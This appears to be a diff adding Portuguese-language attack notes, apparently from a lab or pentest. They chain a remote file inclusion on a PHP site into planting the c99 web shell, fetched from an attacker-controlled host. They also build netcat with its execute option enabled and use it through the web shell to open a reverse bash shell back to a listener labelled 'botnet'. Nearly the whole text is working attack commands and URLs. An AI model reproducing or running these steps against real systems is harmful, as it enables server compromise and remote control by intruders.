@@ -1,0 +1,40 @@
+wget http://192.168.0.220/c99.txt -O /tmp/c99.txt
+
+
+
+http://192.168.0.224/index.php?inc=http://192.168.0.220/comando2.txt&cod=wget%20http://192.168.0.220/c99.txt%20-O%20tmp/c99.txt
+
+http://192.168.0.224/index.php?inc=http://192.168.0.220/comando2.txt&cod=ls%20-l%20tmp
+
+
+http://192.168.0.224/index.php?inc=http://192.168.0.220/comando2.txt&cod=mv%20tmp/c99.txt%20tmp/c99.php
+
+http://192.168.0.224/index.php?inc=http://192.168.0.220/comando2.txt&cod=ls%20-l%20tmp
+
+http://192.168.0.224/tmp/c99.php
+
+https://www.google.com.br/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=2.4.18-3%20exploit
+
+http://www.securityfocus.com/bid/8042/exploit
+http://www.securityfocus.com/bid/8042/discuss
+
+
+## Compilação do NETCAT
+
+vim MakeFile
+add the following line DFLAGS = -DGAPING_SECURITY_HOLE -DTELNET
+
+## res_init error = comment out the res_init line.
+vim netcat.c
+==> http://www.packetwatch.net/netcatfix.php
+
+VIA WEBSHELL NA VITIMA 
+
+wget http://192.168.0.220/netcat/nc
+chmod a+x nc
+./nc -h 2>&1 //valida opções e execução do netcat
+./nc 192.168.0.220 10555 -e /bin/bash //conect back
+
+## NA BOTNET
+nc -l -p 10555 // Listen para connect back
+
